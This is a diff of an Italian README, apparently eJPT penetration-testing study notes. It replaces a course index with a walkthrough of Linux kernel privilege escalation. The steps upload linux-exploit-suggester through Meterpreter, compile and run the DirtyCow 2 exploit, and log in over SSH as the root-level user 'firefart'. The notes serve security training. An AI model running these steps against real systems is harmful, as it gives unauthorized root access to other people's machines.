@@ -1,65 +1,65 @@
-# eJPT
+Gli exploit del kernel su Linux **mirano** tipicamente alle vulnerabilità ****del **kernel** Linux
+per **eseguire codice arbitrario** al fine di eseguire comandi di sistema privilegiati **o**
+**ottenere** una **shell** di sistema.
 
-![Screenshot 2024-12-21 104842](https://github.com/user-attachments/assets/7530661d-b5f1-4a3c-a16c-5ba224b79131)
+- Questo processo varia **in base alla versione e alla distribuzione** del kernel presa di
+mira **e all'exploit del kernel utilizzato**.
+- L'escalation dei privilegi sui sistemi Linux segue in genere la seguente
+**metodologia**:
+    - **Identificazione** delle **vulnerabilità** del kernel
+    - **Scaricare**, **compilare** e **trasferire** gli **exploit** **del kernel sul sistema** di
+    **destinazione**.
 
--[Information Gatering](https://github.com/emanueletroiani/eJPT/tree/Information-Gatering)
+UTILIZZEREMO UN TOOL PER RILEVARE VULNERABILITA’ NEL KERNEL
 
--[Riassunto](https://github.com/emanueletroiani/eJPT/blob/Information-Gatering-riassunto/README.md)
+**Linux-Exploit-Suggester** è stato progettato per aiutare a rilevare le carenze di sicurezza di un determinato kernel Linux o di una macchina basata su Linux. Valuta l'esposizione del kernel dato a ogni exploit del kernel Linux pubblicamente noto.
 
-Assessment Methodologies: Footprinting & Scanning
+- GitHub: https://github.com/mzet-/linux-exploit-suggester
 
--[Networking Primer](https://github.com/emanueletroiani/eJPT/blob/Networking-Primer/README.md)
+EXPLOIT
 
--[Host Discovery](https://github.com/emanueletroiani/eJPT/blob/Host-Discovery-Techniques/README.md)
+1. GitHub: https://github.com/mzet-/linux-exploit-suggester
+    - quick download
+2. Dobbiamo avere una sessione Meterpreter sul target
+3. **cd /tmp** ci mettiamo nella cartella dei file temporanei
+4. **updload /PATH/les.sh** carichiamo il tools sul target linux
+5. **shell**
+6. **/bin/bash -i** ci serve questa shell per dare il permesso di esecuzione
+7. **chmod +x les.sh**
+8. **./les.sh** 
+9. troviamo l’exploit da utilizzare in base a:
+    1. **exposure** deve essere alta
+    2. **tags** match con la versione
+10. nel nostro esempio utilizziamo **DirtyCow 2**
+11. **scarichiamo sul nostro pc** dal link che ci viene fornito dal tool
+12. **sudo apt-get install gcc** scarichiamo gcc per compilare l’exploit DirtyCow
+13. **mv EXPLOIT dirty.c** dobbiamo rinominare l’exploit in **dirty.c**
 
--[Port Scanning](https://github.com/emanueletroiani/eJPT/blob/Port-Scanning/README.md)
+ORA POSSIAMO **compilarlo** DIRETTAMENTE SUL **PC TARGET** **OPPURE** SUL **NOSTRO PC**
 
--[Riassunto comandi
-](https://github.com/emanueletroiani/eJPT/blob/Riassunto1/README.md)
+-direttamente sul target (piu efficave)
 
-Assessment Methodologies: Enumeration
+1. **exit** chiudiamo la sessione shell e torniamo sulla sessione meterpreter
+2. **updload /PATH/dirty.c**
+3. **shell**
+4. **/bin/bash -i**
+5. **gcc -pthread dirty.c -o dirty -lcrypt** complila il file in binario (Comando trovabile nell istruzioni del download)
+6. **chmod +x dirty**  
+7. **./dirty password123** la password credo sia casuale o verificare sul link exploit
 
--[FTP Enumeration](https://github.com/emanueletroiani/eJPT/blob/FTP-Enumeration/README.md)
+su un altro terminale 
 
--[SMB Enumeration](https://github.com/emanueletroiani/eJPT/blob/SMB-Enumeration/README.md)
+1. **ssh firefart@IP_TARGET**
+2. **remove whit**: copiamo and incolliamo il comando per rimuovere la chiave
+3. **ssh firefart@IP_TARGET** nuovamente proviamo ad accedere con la password password123
+4. siamo dentro come amministratore
 
--[Web Server Enumeration](https://github.com/emanueletroiani/eJPT/blob/Web-Server-Enumeration/README.md)
+-dal nostro PC
 
--[MySQL Enumeration](https://github.com/emanueletroiani/eJPT/blob/MySQL-Enumeration/README.md)
-
--[SSH Enumeration](https://github.com/emanueletroiani/eJPT/blob/SSH-Enumeration/README.md)
-
--[SMTP Enumeration](https://github.com/emanueletroiani/eJPT/blob/SMTP-Enumeration/README.md)
-
--[Riassunto](https://github.com/emanueletroiani/eJPT/blob/Riassunto2/README.md)
-
-Assessment Methodologies: Vulnerability Assessment
-
--[Vulnerability Assessment](https://github.com/emanueletroiani/eJPT/blob/Vulnerability-Assessment/README.md)
-
--[Vulnerability Analysis](https://github.com/emanueletroiani/eJPT/tree/Vulnerability-Analysis)
-
--[Vulnerability Scanning](https://github.com/emanueletroiani/eJPT/tree/Vulnerability-Scanning)
-
-Assessment Methodologies: Auditing Fundamentals
-
--[Introduction to Security Auditing](https://github.com/emanueletroiani/eJPT/blob/Introduction-to-Security-Auditing/README.md)
-
--[Governance, Risk & Compliance](https://github.com/emanueletroiani/eJPT/blob/Governance,-Risk-&-Compliance/README.md)
-
--From Auditing to Penetration Testing
-
-Host & Network Penetration Testing: System/Host Based Attacks
-
--[Windows Vulnerabilities](https://github.com/emanueletroiani/eJPT/blob/Windows-Vulnerabilities/README.md)
-
--[Exploiting Windows Vulnerabilities](https://github.com/emanueletroiani/eJPT/tree/Exploiting-Windows-Vulnerabilities)
-
--[Windows Privilege Escalation](https://github.com/emanueletroiani/eJPT/edit/Windows-Privilege-Escalation/README.md)
-
--[Windows File System Vulnerabilities](https://github.com/emanueletroiani/eJPT/blob/Alternate-Data-Streams/README.md)
-
--[Windows Credential Dumping](https://github.com/emanueletroiani/eJPT/tree/Windows-Credential-Dumping)
-
--Exploiting Linux Vulnerabilities
-
+1. **gcc -pthread dirty.c -o dirty -lcrypt** complila il file in binario (Comando trovabile nell istruzioni del download) **(su un altro terminale)**
+2. **exit** chiudiamo la sessione shell e torniamo sulla sessione meterpreter
+3. **updload /PATH/dirty**
+4. **shell**
+5. **/bin/bash -i**
+6. **chmod +x dirty**  
+7. **./dirty password123** la password credo sia casuale o verificare sul link exploit
